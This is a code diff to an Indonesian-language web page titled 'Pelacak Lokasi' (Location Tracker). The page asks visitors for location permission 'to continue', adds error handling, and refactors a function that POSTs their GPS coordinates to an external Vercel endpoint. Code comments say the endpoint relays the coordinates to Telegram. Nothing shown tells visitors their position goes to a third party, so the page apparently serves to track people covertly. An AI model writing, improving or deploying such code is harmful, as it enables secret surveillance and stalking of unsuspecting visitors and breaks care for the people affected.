@@ -41,29 +41,6 @@
         text-align: center;
         padding: 20px;
       }
-      .pulse {
-        display: inline-block;
-        width: 20px;
-        height: 20px;
-        border-radius: 50%;
-        background: #4caf50;
-        margin-right: 10px;
-        animation: pulse 1.5s infinite;
-      }
-      @keyframes pulse {
-        0% {
-          transform: scale(0.95);
-          box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7);
-        }
-        70% {
-          transform: scale(1);
-          box-shadow: 0 0 0 10px rgba(76, 175, 80, 0);
-        }
-        100% {
-          transform: scale(0.95);
-          box-shadow: 0 0 0 0 rgba(76, 175, 80, 0);
-        }
-      }
       #map {
         height: 400px;
         width: 100%;
@@ -71,15 +48,24 @@
         border-radius: 10px;
         border: 1px solid #ddd;
       }
+      #error-message {
+        margin-top: 20px;
+        color: red;
+        font-weight: bold;
+      }
     </style>
   </head>
   <body>
     <div id="loadingScreen" class="loading-screen">
       <h1>Pelacak Lokasi</h1>
       <p>Mohon izinkan akses lokasi untuk melanjutkan</p>
-      <div class="pulse"></div>
       <p id="loadingStatus">Meminta izin lokasi...</p>
-      <button id="locateBtn" style="display: none">Izinkan Lokasi</button>
+      <button id="locateBtn" style="display: none" onclick="getLocation()">
+        Izinkan Lokasi
+      </button>
+      <p id="error-message" class="hidden">
+        Lokasi tidak dapat diakses. Pastikan GPS diaktifkan.
+      </p>
     </div>
 
     <div id="mainContent" class="container hidden">
@@ -94,6 +80,7 @@
         setTimeout(getLocation, 500);
       });
 
+      // Fungsi untuk meminta lokasi
       function getLocation() {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(showPosition, showError, {
@@ -108,6 +95,7 @@
         }
       }
 
+      // Menampilkan posisi setelah izin lokasi diberikan
       function showPosition(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
@@ -122,9 +110,28 @@
         );
 
         initMap(latitude, longitude);
-        shareLocationToTelegram();
+        shareLocationToTelegram(latitude, longitude); // Fungsi kirim lokasi ke Telegram
       }
 
+      // Menangani error saat mendapatkan lokasi
+      function showError(error) {
+        // Jika lokasi tidak dapat ditemukan, tampilkan pesan error dan tombol izinkan lokasi
+        if (error.code === error.PERMISSION_DENIED) {
+          document.getElementById("loadingStatus").textContent =
+            "Anda menolak izin lokasi.";
+        } else if (error.code === error.POSITION_UNAVAILABLE) {
+          document.getElementById("loadingStatus").textContent =
+            "Posisi tidak tersedia.";
+        } else if (error.code === error.TIMEOUT) {
+          document.getElementById("loadingStatus").textContent =
+            "Waktu permintaan lokasi habis.";
+        }
+
+        document.getElementById("locateBtn").style.display = "block";
+        document.getElementById("error-message").classList.remove("hidden");
+      }
+
+      // Inisialisasi peta dengan Leaflet
       function initMap(lat, lng) {
         if (!map) {
           map = L.map("map").setView([lat, lng], 15);
@@ -138,22 +145,17 @@
         }
       }
 
-      function showError(error) {
-        document.getElementById("loadingStatus").textContent =
-          "Gagal mendapatkan lokasi.";
-        document.getElementById("locateBtn").style.display = "block";
-      }
-
-      function shareLocationToTelegram() {
-        if (!currentPosition) return;
-
-        const latitude = currentPosition.latitude;
-        const longitude = currentPosition.longitude;
-
+      // Fungsi untuk mengirim lokasi ke Telegram
+      function shareLocationToTelegram(latitude, longitude) {
         fetch("https://nyobaloca.vercel.app/send-location", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ latitude, longitude }),
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            latitude: latitude,
+            longitude: longitude,
+          }),
         })
           .then((response) => response.json())
           .then((data) => {
